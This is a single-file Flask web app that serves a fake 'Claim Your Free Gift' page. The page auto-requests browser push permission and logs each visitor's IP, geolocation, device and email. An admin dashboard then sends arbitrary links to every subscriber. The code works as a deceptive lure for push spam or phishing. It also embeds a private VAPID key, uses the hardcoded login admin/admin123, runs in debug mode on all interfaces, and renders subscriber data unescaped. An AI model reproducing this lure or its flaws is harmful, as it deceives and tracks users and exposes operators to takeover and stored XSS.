# app.py
# Single-file PWA + WebPush + Admin dashboard (matrix UI)
# VAPID keys embedded directly (as requested)

import os
import json
import sqlite3
import pathlib
import datetime
import re
from functools import wraps

import requests
from flask import (
    Flask, request, jsonify, render_template_string, redirect, url_for, session,
    send_from_directory, make_response, flash, abort
)
from werkzeug.utils import secure_filename
from pywebpush import webpush, WebPushException

# Pillow optional (for generated icons)
try:
    from PIL import Image, ImageDraw
    PIL_AVAILABLE = True
except Exception:
    PIL_AVAILABLE = False

# ---------------- Config ----------------
BASE = pathlib.Path(__file__).parent.resolve()
DATA_DIR = BASE / "data"; DATA_DIR.mkdir(exist_ok=True)
STATIC_DIR = BASE / "static"; STATIC_DIR.mkdir(exist_ok=True)
UPLOAD_DIR = STATIC_DIR / "uploads"; UPLOAD_DIR.mkdir(exist_ok=True)

DB_FILE = DATA_DIR / "app.db"
ALLOWED_EXT = {"png", "jpg", "jpeg", "webp", "gif"}

# ---------- YOUR VAPID KEYS (embedded) ----------
VAPID_PUBLIC_KEY  = "BI0vwIoEg8D2Qxxvw2_x-Fz2gsrJll-GNZIa1Lk-DvCwPaYD7zv9RIJ1JbvS4JxDKGiBZOcmB03zR0HPwC4yAWk"
VAPID_PRIVATE_KEY = "MhcXKQarkFUcdXEOetIxI7qy15X6cjRz-LLO5SNILys"
VAPID_CLAIMS = {"sub": "mailto:kaalilinux63@gmail.com"}

# Admin credentials
ADMIN_USER = "admin"
ADMIN_PASS = "admin123"

app = Flask(__name__, static_folder=str(STATIC_DIR))
app.secret_key = os.getenv("FLASK_SECRET", "change_this_secret_for_prod")

# ---------------- Icons (programmatic) ----------------
ICON_PNG = STATIC_DIR / "icon.png"
APPLE_ICON = STATIC_DIR / "apple-touch-icon.png"
SVG_FALLBACK = STATIC_DIR / "icon.svg"

def ensure_icons():
    if PIL_AVAILABLE:
        if not ICON_PNG.exists():
            size = 192
            img = Image.new("RGBA", (size, size), (0,0,0,0))
            draw = ImageDraw.Draw(img)
            draw.rectangle((size*0.15, size*0.2, size*0.85, size*0.8), outline=(57,255,20), width=6)
            draw.line((size*0.5, size*0.2, size*0.5, size*0.8), fill=(138,43,226), width=6)
            img.save(ICON_PNG)
        if not APPLE_ICON.exists():
            try:
                Image.open(ICON_PNG).resize((180,180)).save(APPLE_ICON)
            except Exception:
                pass
    else:
        if not SVG_FALLBACK.exists():
            svg = """<svg xmlns='http://www.w3.org/2000/svg' width='192' height='192'>
  <rect width='100%' height='100%' fill='black'/>
  <rect x='30' y='40' width='132' height='112' fill='none' stroke='#39ff14' stroke-width='6'/>
  <line x1='96' y1='40' x2='96' y2='152' stroke='#8a2be2' stroke-width='6'/>
</svg>"""
            SVG_FALLBACK.write_text(svg, encoding="utf-8")

ensure_icons()

# ---------------- Database ----------------
def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS subscribers (
        id INTEGER PRIMARY KEY,
        endpoint TEXT UNIQUE,
        p256dh TEXT,
        auth TEXT,
        ua TEXT,
        device TEXT,
        ip TEXT,
        city TEXT,
        country TEXT,
        nickname TEXT,
        email TEXT,
        subscribed_at TEXT,
        last_status TEXT,
        last_error TEXT
    )""")
    c.execute("""CREATE TABLE IF NOT EXISTS history (
        id INTEGER PRIMARY KEY,
        time TEXT,
        title TEXT,
        body TEXT,
        image TEXT,
        link TEXT,
        sent INTEGER,
        failed INTEGER,
        removed INTEGER
    )""")
    conn.commit()
    conn.close()

init_db()
def db_conn():
    return sqlite3.connect(DB_FILE)

# ---------------- Helpers ----------------
def parse_device(ua: str) -> str:
    if not ua: return "Unknown"
    parts = []
    if "Android" in ua: parts.append("Android")
    elif "iPhone" in ua: parts.append("iPhone iOS")
    elif "iPad" in ua: parts.append("iPad iOS")
    elif "Windows" in ua: parts.append("Windows")
    elif "Macintosh" in ua or "Mac OS X" in ua: parts.append("macOS")
    elif "Linux" in ua: parts.append("Linux")
    if " Edg/" in ua or "EdgA/" in ua: parts.append("Edge")
    elif "Chrome/" in ua and "Chromium" not in ua: parts.append("Chrome")
    elif "Firefox/" in ua: parts.append("Firefox")
    elif "Safari/" in ua and "Chrome" not in ua: parts.append("Safari")
    return " · ".join(parts) if parts else ua[:48]

def geoip_lookup(ip: str):
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,query", timeout=4)
        j = r.json()
        if j.get("status") == "success":
            return {"country": j.get("country",""), "city": j.get("city","")}
    except Exception:
        pass
    return {"country":"", "city":""}

def require_admin(f):
    @wraps(f)
    def inner(*args, **kwargs):
        if not session.get("admin"):
            return redirect(url_for("admin_login"))
        return f(*args, **kwargs)
    return inner

# ---------------- Service worker, manifest, icons ----------------
SW_JS = r"""
self.addEventListener('install', e => self.skipWaiting());
self.addEventListener('activate', e => e.waitUntil(self.clients.claim()));
self.addEventListener('push', event => {
  let data = {};
  try { data = event.data.json(); } catch(e){}
  const options = {
    body: data.body || '',
    icon: data.image || '/icon.png',
    image: data.image || undefined,
    data: { url: data.link || '/' },
    vibrate: [120,40,120],
    badge: '/icon.png'
  };
  event.waitUntil(self.registration.showNotification(data.title || 'Notification', options));
});
self.addEventListener('notificationclick', event => {
  event.notification.close();
  const url = (event.notification.data && event.notification.data.url) || '/';
  event.waitUntil(clients.openWindow(url));
});
"""

@app.get("/service-worker.js")
def service_worker():
    resp = make_response(SW_JS)
    resp.headers["Content-Type"] = "application/javascript"
    return resp

@app.get("/manifest.json")
def manifest():
    m = {
        "name": "Gift Notifier",
        "short_name": "Gift",
        "start_url": "/",
        "scope": "/",
        "display": "standalone",
        "background_color": "#000000",
        "theme_color": "#000000",
        "icons": [
            {"src": "/icon.png", "sizes": "192x192", "type": "image/png"},
            {"src": "/icon.png", "sizes": "512x512", "type": "image/png"}
        ]
    }
    return make_response(json.dumps(m), 200, {"Content-Type":"application/manifest+json"})

@app.get("/icon.png")
def icon_png():
    if ICON_PNG.exists(): return send_from_directory(app.static_folder, "icon.png")
    if (STATIC_DIR / "icon.svg").exists(): return send_from_directory(app.static_folder, "icon.svg")
    abort(404)

@app.get("/apple-touch-icon.png")
def apple_icon():
    if APPLE_ICON.exists(): return send_from_directory(app.static_folder, "apple-touch-icon.png")
    if (STATIC_DIR / "apple-touch-icon.svg").exists(): return send_from_directory(app.static_folder, "apple-touch-icon.svg")
    abort(404)

# ---------------- User landing (matrix + Claim Gift) ----------------
USER_HTML = r"""
<!doctype html>
<html>
<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Claim Your Free Gift</title>
<link rel="manifest" href="/manifest.json">
<link rel="apple-touch-icon" href="/apple-touch-icon.png">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="theme-color" content="#000000">
<style>
:root{--neon:#39ff14;--neon2:#8a2be2}
html,body{height:100%;margin:0;background:#000;color:#caffc4;font-family:Inter,system-ui}
canvas#matrix{position:fixed;inset:0;z-index:0}
.container{position:relative;z-index:2;display:flex;align-items:center;justify-content:center;height:100vh;padding:20px}
.card{width:920px;max-width:96%;background:linear-gradient(180deg,rgba(4,8,10,0.85),rgba(2,6,8,0.65));padding:20px;border-radius:12px;border:1px solid rgba(57,255,20,0.04)}
h1{color:var(--neon);margin:0 0 6px}
.subtitle{color:#9ef09a;margin-top:4px}
.neon-btn{background:linear-gradient(90deg,var(--neon),var(--neon2));border:0;padding:14px 18px;border-radius:10px;color:#041018;font-weight:900;cursor:pointer;box-shadow:0 0 16px rgba(57,255,20,0.3)}
.preview{background:#071826;padding:12px;border-radius:10px;margin-top:12px;border:1px solid rgba(138,43,226,0.06)}
.muted{color:#9ef09a;font-size:13px}
.input-lite{background:transparent;border:1px solid rgba(255,255,255,0.06);padding:9px;border-radius:8px;color:#dfffd8;width:100%;margin-top:8px}
.overlay{position:fixed;inset:0;background:rgba(0,0,0,0.9);display:none;align-items:center;justify-content:center;z-index:6}
.overlay .box{width:92%;max-width:540px;background:rgba(2,6,8,0.98);border:1px solid var(--neon);border-radius:10px;padding:18px;color:#9ef09a;font-family:monospace;white-space:pre-wrap}
</style>
</head>
<body>
<canvas id="matrix"></canvas>

<div class="overlay" id="iosOverlay"><div class="box" id="iosBox"></div></div>

<div class="container">
  <div class="card">
    <h1>🎁 Claim Your Free Gift</h1>
    <div class="subtitle">Allow notifications to receive your gift code & timely reminders.</div>
    <div style="margin-top:16px;display:flex;align-items:center;gap:12px">
      <button id="claimBtn" class="neon-btn">Claim Gift</button>
      <div id="status" class="muted">Ready</div>
    </div>

    <div class="preview" style="margin-top:12px">
      <div id="pTitle" style="font-weight:700">Free Gift Awaits — Claim now!</div>
      <div id="pBody" style="opacity:.9">Tap to get your gift code and instructions.</div>
      <div class="muted" id="pLink">Opens: /</div>
    </div>

    <div style="margin-top:10px">
      <input id="nickname" placeholder="Optional device nickname" class="input-lite">
      <input id="email" placeholder="Optional email for delivery" class="input-lite">
    </div>
  </div>
</div>

<script>
/* Matrix animation */
const canvas = document.getElementById('matrix'); const ctx = canvas.getContext('2d');
let size=16, cols, drops=[];
function resize(){canvas.width=innerWidth;canvas.height=innerHeight;cols=Math.floor(canvas.width/size);drops=Array(cols).fill(1);}
window.addEventListener('resize', resize); resize();
const chars="ﾊﾐﾋｰｳﾌｼﾅﾓﾆﾆｻﾜﾂｵﾘｲﾁﾄｽｶﾝﾏｾﾃﾈｻﾞﾀﾔﾘ";
function step(){ ctx.fillStyle='rgba(0,0,0,0.2)';ctx.fillRect(0,0,canvas.width,canvas.height); ctx.font=size+'px monospace';
  for(let i=0;i<cols;i++){ const text = chars[Math.floor(Math.random()*chars.length)]; ctx.fillStyle='rgba(57,255,20,0.85)'; ctx.fillText(text,i*size,drops[i]*size);
    if(drops[i]*size > canvas.height && Math.random()>0.975) drops[i]=0; drops[i]++; }
  requestAnimationFrame(step);
}
requestAnimationFrame(step);

/* Helpers */
const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
const isSafari = /^((?!chrome|android).)*safari/i.test(navigator.userAgent);
const isStandalone = window.matchMedia('(display-mode: standalone)').matches || window.navigator.standalone === true;
const PUBLIC_KEY = "{{ vapid_key }}";

function urlBase64ToUint8Array(base64String) {
  const padding = '='.repeat((4 - base64String.length % 4) % 4);
  const base64 = (base64String + padding).replace(/-/g, '+').replace(/_/g, '/');
  const rawData = atob(base64);
  return Uint8Array.from([...rawData].map(c=>c.charCodeAt(0)));
}

/* Service Worker registration */
async function ensureSW(){
  if(!('serviceWorker' in navigator)) throw new Error('No ServiceWorker support');
  await navigator.serviceWorker.register('/service-worker.js', {scope: '/'});
  return navigator.serviceWorker.ready;
}

/* Subscribe / UI */
async function subscribeFlow(){
  try{
    const reg = await ensureSW();
    const perm = await Notification.requestPermission();
    if(perm !== 'granted'){ document.getElementById('status').textContent='Permission denied'; return false; }
    const sub = await reg.pushManager.subscribe({
      userVisibleOnly: true,
      applicationServerKey: urlBase64ToUint8Array(PUBLIC_KEY)
    });
    const nickname = document.getElementById('nickname').value || '';
    const email = document.getElementById('email').value || '';
    await fetch('/subscribe', {
      method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify({subscription: sub, nickname, email, ua: navigator.userAgent})
    });
    document.getElementById('status').textContent = 'We will inform you after winner announcement.';
    alert('We will inform you after winner announcement.');
    return true;
  }catch(e){ console.error(e); alert('Subscription failed. Ensure HTTPS and check console.'); return false; }
}

/* iOS guidance overlay */
function showIOSGuide(text){
  const ov = document.getElementById('iosOverlay'); const bx = document.getElementById('iosBox');
  bx.textContent = ''; ov.style.display='flex';
  let i=0; function t(){ if(i<text.length){ bx.textContent += text.charAt(i); i++; setTimeout(t,18);} else { const ok = document.createElement('div'); ok.style.marginTop='12px'; ok.innerHTML = '<button style=\"padding:10px 12px;border-radius:8px;border:0;background:linear-gradient(90deg,#39ff14,#8a2be2);\">OK</button>'; ok.querySelector('button').onclick = ()=>ov.style.display='none'; bx.appendChild(ok);} } t();
}

/* Auto prompt for non-iOS after 2s */
setTimeout(async ()=>{
  if(!isIOS){
    try{
      const reg = await ensureSW();
      const perm = await Notification.requestPermission();
      if(perm === 'granted'){
        const sub = await reg.pushManager.subscribe({ userVisibleOnly:true, applicationServerKey: urlBase64ToUint8Array(PUBLIC_KEY) });
        await fetch('/subscribe', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({subscription: sub, nickname:'', ua: navigator.userAgent})});
        document.getElementById('status').textContent = 'We will inform you after winner announcement.';
      } else {
        document.getElementById('status').textContent = 'Tap Claim Gift to allow notifications';
      }
    }catch(e){
      console.warn('Auto subscribe failed', e);
      document.getElementById('status').textContent = 'Tap Claim Gift to allow notifications';
    }
  } else {
    if(!isSafari){
      showIOSGuide('iOS detected. Push not supported in Chrome/Firefox on iPhone. Open in Safari.');
    } else if(!isStandalone){
      showIOSGuide('iOS Safari detected. To receive push:\\n1) Tap Share → Add to Home Screen\\n2) Open from Home Screen icon\\n3) Tap Claim Gift to allow notifications');
    }
  }
}, 2000);

/* Button handler */
document.getElementById('claimBtn').addEventListener('click', async ()=>{
  if(isIOS && !isStandalone){
    if(!isSafari){ showIOSGuide('iOS detected. Push not supported in Chrome/Firefox on iPhone. Open in Safari and add to Home Screen.'); return; }
    showIOSGuide('Please Add to Home Screen and open from the icon, then tap Claim Gift.');
    return;
  }
  const ok = await subscribeFlow();
  if(ok){ document.getElementById('status').textContent = 'We will inform you after winner announcement.'; }
});
</script>
</body>
</html>
"""

@app.get("/")
def user_landing():
    return render_template_string(USER_HTML, vapid_key=VAPID_PUBLIC_KEY)

# ---------------- Subscribe endpoint ----------------
@app.post("/subscribe")
def subscribe():
    body = request.get_json(force=True, silent=True) or {}
    sub = body.get("subscription") or body.get("sub") or body
    nickname = (body.get("nickname") or "").strip()
    email = (body.get("email") or "").strip()
    ua = body.get("ua") or request.headers.get("User-Agent","")
    if not sub or "endpoint" not in sub:
        return jsonify({"error":"invalid subscription"}), 400

    endpoint = sub.get("endpoint")
    keys = sub.get("keys", {})
    p256dh = keys.get("p256dh","")
    auth = keys.get("auth","")
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    device = parse_device(ua)
    geo = geoip_lookup(ip)
    subscribed_at = datetime.datetime.utcnow().isoformat() + "Z"

    conn = db_conn(); c = conn.cursor()
    c.execute("SELECT id FROM subscribers WHERE endpoint = ?", (endpoint,))
    if c.fetchone():
        c.execute("""UPDATE subscribers SET p256dh=?, auth=?, ua=?, device=?, ip=?, city=?, country=?, nickname=?, email=?, subscribed_at=? WHERE endpoint=?""",
                  (p256dh, auth, ua, device, ip, geo.get("city",""), geo.get("country",""), nickname, email, subscribed_at, endpoint))
    else:
        c.execute("""INSERT INTO subscribers (endpoint,p256dh,auth,ua,device,ip,city,country,nickname,email,subscribed_at,last_status,last_error)
                     VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)""",
                  (endpoint,p256dh,auth,ua,device,ip,geo.get("city",""),geo.get("country",""),nickname,email,subscribed_at,None,None))
    conn.commit(); conn.close()
    return jsonify({"ok":True})

# ---------------- Admin login ----------------
@app.get("/admin")
def admin_login():
    return render_template_string(r"""
    <!doctype html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Admin Login</title>
    <style>
      body{background:#01060a;color:#caffc4;font-family:Inter,system-ui;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}
      .box{background:#06121a;padding:24px;border-radius:12px;border:1px solid rgba(57,255,20,0.06)}
      input{display:block;width:260px;margin:8px 0;padding:10px;border-radius:8px;border:1px solid rgba(255,255,255,0.04);background:transparent;color:#dfffd8}
      button{padding:10px 14px;border-radius:8px;border:0;background:linear-gradient(90deg,#39ff14,#8a2be2);font-weight:700;cursor:pointer}
    </style>
    </head><body>
      <div class="box">
        <h2>Admin Login</h2>
        <form method="post" action="/admin/login">
          <input name="username" placeholder="username" required>
          <input name="password" placeholder="password" type="password" required>
          <div style="margin-top:8px"><button type="submit">Sign in</button></div>
        </form>
      </div>
    </body></html>
    """)

@app.post("/admin/login")
def admin_login_post():
    user = request.form.get("username","")
    pw = request.form.get("password","")
    if user == ADMIN_USER and pw == ADMIN_PASS:
        session["admin"] = True
        return redirect(url_for("admin_dashboard"))
    flash("Invalid credentials")
    return redirect(url_for("admin_login"))

@app.get("/admin/logout")
def admin_logout():
    session.pop("admin", None)
    return redirect(url_for("admin_login"))

# ---------------- Admin Dashboard ----------------
ADMIN_HTML = r"""
<!doctype html>
<html>
<head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Push Dashboard</title>
<style>
:root{--bg:#0b132b;--card:#1c2541;--muted:#3a506b;--accent:#5bc0be;--text:#e0e6ef}
body{margin:0;background:var(--bg);color:var(--text);font-family:Inter,system-ui}
.wrap{max-width:1100px;margin:auto;padding:24px}
.card{background:var(--card);border-radius:12px;padding:16px;margin-bottom:16px}
input,textarea{width:100%;padding:10px;border-radius:8px;border:1px solid #20304f;background:#14213d;color:var(--text)}
button{padding:10px 12px;border-radius:8px;border:0;background:linear-gradient(90deg,#39ff14,#8a2be2);cursor:pointer}
.preview{background:#071826;padding:12px;border-radius:8px;margin-top:8px;border:1px solid #20304f}
.small{font-size:13px;color:#a7b3c4}
table{width:100%;border-collapse:collapse}
th,td{padding:8px;border-bottom:1px solid #20304f;font-size:13px}
</style>
</head>
<body>
<div class="wrap">
  <div style="display:flex;justify-content:space-between;align-items:center">
    <h1>Push Dashboard</h1>
    <div><a href="/admin/logout" style="color:#9ef09a">Logout</a></div>
  </div>

  <div class="card">
    <h3>Compose Push</h3>
    <div style="display:flex;gap:12px">
      <div style="flex:1">
        <input id="title" placeholder="Title">
        <textarea id="body" placeholder="Message" style="margin-top:8px"></textarea>
        <input id="link" placeholder="Click URL" style="margin-top:8px">
        <div style="margin-top:8px;display:flex;gap:8px;align-items:center">
          <input id="file" type="file" accept="image/*">
          <button id="uploadBtn">Upload image</button>
          <div id="imgStatus" class="small">No image</div>
        </div>
        <div style="margin-top:8px;display:flex;gap:8px">
          <button id="sendBtn">Send to all</button>
          <button id="sendTestBtn">Send test</button>
        </div>
      </div>
      <div style="width:320px">
        <div class="preview">
          <div id="pTitle" style="font-weight:700">Title preview</div>
          <div id="pBody" style="opacity:.9;margin-top:4px">Body preview</div>
          <img id="pImg" style="width:100%;display:none;margin-top:8px;border-radius:6px">
          <div class="small" style="margin-top:8px">Opens: <span id="pLink">/</span></div>
        </div>
        <div style="margin-top:12px" class="small">Subscribers: <span id="subCount">0</span></div>
      </div>
    </div>
  </div>

  <div class="card">
    <h3>Subscribers</h3>
    <div style="max-height:300px;overflow:auto">
      <table><thead><tr><th>IP</th><th>Device</th><th>Nickname</th><th>Email</th><th>Added</th><th>City</th><th>Country</th><th>Status</th></tr></thead>
      <tbody id="subsBody"></tbody></table>
    </div>
  </div>

  <div class="card">
    <h3>History</h3>
    <div id="historyWrap" class="small">Loading...</div>
  </div>
</div>

<script>
let uploadedImage = "";
let localPreviewURL = "";

function updatePreview(){
  document.getElementById('pTitle').innerText = document.getElementById('title').value || 'Title preview';
  document.getElementById('pBody').innerText = document.getElementById('body').value || 'Body preview';
  document.getElementById('pLink').innerText = document.getElementById('link').value || '/';
  const img = document.getElementById('pImg');
  const src = uploadedImage || localPreviewURL;
  if(src){ img.src = src; img.style.display='block'; } else { img.style.display='none' }
}
['title','body','link'].forEach(id=>document.getElementById(id).addEventListener('input', updatePreview));

// instant preview
document.getElementById('file').addEventListener('change', (e)=>{
  const f = e.target.files[0]; uploadedImage = "";
  if(f){
    if(localPreviewURL) URL.revokeObjectURL(localPreviewURL);
    localPreviewURL = URL.createObjectURL(f);
    document.getElementById('imgStatus').innerText = 'Preview ready (not uploaded)';
    updatePreview();
  }
});

// upload to server
document.getElementById('uploadBtn').addEventListener('click', async (e)=>{
  e.preventDefault();
  const f = document.getElementById('file').files[0]; if(!f){ alert('Pick image'); return; }
  const fd = new FormData(); fd.append('file', f);
  const r = await fetch('/upload', {method:'POST', body: fd});
  const j = await r.json();
  if(j.url){ uploadedImage = j.url; document.getElementById('imgStatus').innerText = 'Uploaded ✓'; updatePreview(); } else alert(j.error||'upload failed');
});

async function loadStats(){
  const s = await fetch('/stats'); const j = await s.json();
  document.getElementById('subCount').innerText = j.count;
  const subs = await fetch('/subscribers'); const arr = await subs.json();
  const body = document.getElementById('subsBody'); body.innerHTML = '';
  for(const s of arr){
    const tr = document.createElement('tr');
    tr.innerHTML = `<td>${s.ip}</td><td>${s.device}</td><td>${s.nickname||''}</td><td>${s.email||''}</td><td>${s.subscribed_at}</td><td>${s.city||''}</td><td>${s.country||''}</td><td>${s.last_status||''}${s.last_error?('<div style="color:#f66">'+s.last_error+'</div>'):''}</td>`;
    body.appendChild(tr);
  }
  const h = await fetch('/history'); const hist = await h.json();
  const histWrap = document.getElementById('historyWrap'); if(hist.length===0) histWrap.innerText='No history';
  else {
    let html = '<table style="width:100%"><thead><tr><th>Time</th><th>Title</th><th>Sent/Fail/Removed</th></tr></thead><tbody>';
    for(const it of hist){
      html += `<tr><td>${it.time}</td><td>${it.title}</td><td>${it.sent}/${it.failed}/${it.removed}</td></tr>`;
    }
    html += '</tbody></table>';
    histWrap.innerHTML = html;
  }
}

document.getElementById('sendBtn').addEventListener('click', async ()=>{
  const payload = { title: document.getElementById('title').value, body: document.getElementById('body').value, image: uploadedImage, link: document.getElementById('link').value };
  const res = await fetch('/send', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify(payload)});
  const j = await res.json();
  if(j.error) alert(j.error); else { alert(`Sent ${j.sent} / failed ${j.failed}`); loadStats(); }
});

document.getElementById('sendTestBtn').addEventListener('click', async ()=>{
  const payload = { title:'Test', body:'This is a test push', image: uploadedImage, link:'/' };
  const res = await fetch('/send', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify(payload)});
  const j = await res.json(); if(j.error) alert(j.error); else { alert(`Sent ${j.sent}`); loadStats(); }
});

loadStats();
</script>
</body>
</html>
"""

@app.get("/dashboard")
@require_admin
def admin_dashboard():
    return render_template_string(ADMIN_HTML)

# ---------------- Admin endpoints ----------------
@app.get("/stats")
@require_admin
def stats():
    conn = db_conn(); c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM subscribers")
    count = c.fetchone()[0]
    conn.close()
    return jsonify({"count": count})

@app.get("/subscribers")
@require_admin
def subscribers():
    conn = db_conn(); c = conn.cursor()
    c.execute("SELECT ip,device,nickname,email,subscribed_at,city,country,last_status,last_error FROM subscribers ORDER BY subscribed_at DESC")
    rows = c.fetchall(); conn.close()
    out = []
    for r in rows:
        out.append({"ip": r[0], "device": r[1], "nickname": r[2], "email": r[3], "subscribed_at": r[4], "city": r[5], "country": r[6], "last_status": r[7], "last_error": r[8]})
    return jsonify(out)

@app.get("/history")
@require_admin
def get_history():
    conn = db_conn(); c = conn.cursor()
    c.execute("SELECT time,title,body,image,link,sent,failed,removed FROM history ORDER BY time DESC")
    rows = c.fetchall(); conn.close()
    out = []
    for r in rows:
        out.append({"time": r[0], "title": r[1], "body": r[2], "image": r[3], "link": r[4], "sent": r[5], "failed": r[6], "removed": r[7]})
    return jsonify(out)

@app.post("/upload")
@require_admin
def upload_file():
    if "file" not in request.files:
        return jsonify({"error":"no file"}), 400
    f = request.files["file"]
    if not f or not f.filename:
        return jsonify({"error":"no filename"}), 400
    ext = f.filename.rsplit(".",1)[-1].lower() if "." in f.filename else ""
    if ext not in ALLOWED_EXT:
        return jsonify({"error": f"invalid file type .{ext}"}), 400
    name = secure_filename(f"{datetime.datetime.utcnow().strftime('%Y%m%d%H%M%S')}_{f.filename}")
    path = UPLOAD_DIR / name
    f.save(path)
    url = f"/static/uploads/{name}"
    return jsonify({"url": url})

# ---------------- Send (patched to avoid aud claim issue) ----------------
# ---------------- Send (patched with iOS Safari aud fix) ----------------
@app.post("/send")
@require_admin
def send_push():
    data = request.get_json(force=True, silent=True) or {}
    title = (data.get("title") or "Notification").strip()
    body = (data.get("body") or "").strip()
    image = (data.get("image") or "").strip()
    link = (data.get("link") or "/").strip()
    payload = json.dumps({"title": title, "body": body, "image": image, "link": link})

    conn = db_conn()
    c = conn.cursor()
    c.execute("SELECT id, endpoint, p256dh, auth FROM subscribers")
    subs = c.fetchall()
    ok = failed = removed = 0

    for sid, endpoint, p256dh, auth in subs:
        sub_info = {
            "endpoint": endpoint,
            "keys": {"p256dh": p256dh, "auth": auth}
        }
        try:
            # Copy default claims
            vapid_claims = VAPID_CLAIMS.copy()

            # ✅ iOS Safari fix — adjust audience if endpoint is Apple Push Service
            if "webpush.icloud.com" in endpoint:
                vapid_claims["aud"] = "https://webpush.icloud.com"

            webpush(subscription_info=sub_info, data=payload,
                    vapid_private_key=VAPID_PRIVATE_KEY,
                    vapid_claims=vapid_claims)

            ok += 1
            c.execute("UPDATE subscribers SET last_status=?, last_error=? WHERE id=?", ("sent", None, sid))
        except WebPushException as ex:
            failed += 1
            err_txt = str(ex)
            c.execute("UPDATE subscribers SET last_status=?, last_error=? WHERE id=?", ("failed", err_txt[:800], sid))
            code = getattr(ex.response, "status_code", None) if hasattr(ex, "response") else None
            if code in (404, 410):
                removed += 1
                c.execute("DELETE FROM subscribers WHERE id=?", (sid,))
        except Exception as ex2:
            failed += 1
            c.execute("UPDATE subscribers SET last_status=?, last_error=? WHERE id=?", ("failed", str(ex2)[:800], sid))

    # store history
    c.execute("INSERT INTO history (time,title,body,image,link,sent,failed,removed) VALUES (?,?,?,?,?,?,?,?)",
              (datetime.datetime.utcnow().isoformat()+"Z", title, body, image, link, ok, failed, removed))
    conn.commit()
    conn.close()
    return jsonify({"sent": ok, "failed": failed, "removed": removed})

# ---------------- Static files ----------------
@app.route("/static/<path:fname>")
def static_files(fname):
    return send_from_directory(app.static_folder, fname)

# ---------------- Run ----------------
if __name__ == "__main__":
    print("Starting server on http://0.0.0.0:3000")
    print("Admin:", ADMIN_USER, "/", ADMIN_PASS)
    print("VAPID public key:", VAPID_PUBLIC_KEY)
    app.run(host="0.0.0.0", port=3000, debug=True)
